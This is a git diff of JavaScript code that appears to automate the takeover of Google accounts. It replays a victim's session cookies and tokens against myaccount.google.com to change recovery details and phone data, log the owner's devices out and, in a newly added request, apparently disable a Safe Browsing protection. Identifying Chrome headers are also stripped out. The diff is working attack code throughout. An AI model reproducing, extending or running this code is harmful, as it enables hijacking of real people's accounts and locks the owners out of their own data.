@@ -262,8 +262,6 @@ function passwordMatching(connection, mData) {
             'sec-fetch-site': 'same-origin',
             'cookie': '__Host-GAPS='+mData[5]+'; '+mData[6],
             'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
-            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=1066499d-aafe-441b-a13b-ce876bcef5f2,signin_mode=all_accounts,signout_mode=show_confirmation',
-            'x-client-data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiVocsBCOKXzQEI45fNAQjom80BCMyczQEI/ZzNAQjtns0BCMCfzQEIhaDNAQiroc0BCL2izQE=',
             'x-same-domain': '1',
         }
     }).then(response => {
@@ -396,12 +394,20 @@ function recoveryChange(connection, mData) {
         try {
             if(!response.data.includes('"er"')) {
                 wrong = false
-                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[11]), {
+                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=B10HMd', getSafeBrowserData(mData[11]), {
                     maxRedirects: 0,
                     validateStatus: null,
                     headers: getHeader(mData[6])
                 }).then(response => {
-                    deviceLogOut(connection, mData)
+                    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[11]), {
+                        maxRedirects: 0,
+                        validateStatus: null,
+                        headers: getHeader(mData[6])
+                    }).then(response => {
+                        deviceLogOut(connection, mData)
+                    }).catch(err => {
+                        deviceLogOut(connection, mData)
+                    })
                 }).catch(err => {
                     deviceLogOut(connection, mData)
                 })
@@ -633,6 +639,10 @@ function getVerificationData(time) {
     return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
 }
 
+function getSafeBrowserData(time) {
+    return 'f.req=%5B%5B%5B%22B10HMd%22%2C%22%5Bnull%2C4%2Cnull%2C10000%2C0%2Cnull%2Cnull%2Cnull%2C%5B%5B%5C%22%5C%22%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
+}
+
 function getPhoneData(data, time) {
     return 'f.req='+encodeURIComponent(JSON.stringify([[[data['type'],"[[3,\""+data['number']+"\",null,null,"+data['token']+",null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
 }
@@ -704,7 +714,6 @@ function getHeader(cookie) {
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
-        'x-client-data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiVocsBCOKXzQEI45fNAQjom80BCMyczQEI/ZzNAQjtns0BCMCfzQEIhaDNAQiroc0BCL2izQE=',
         'x-same-domain': '1',
     }
 }
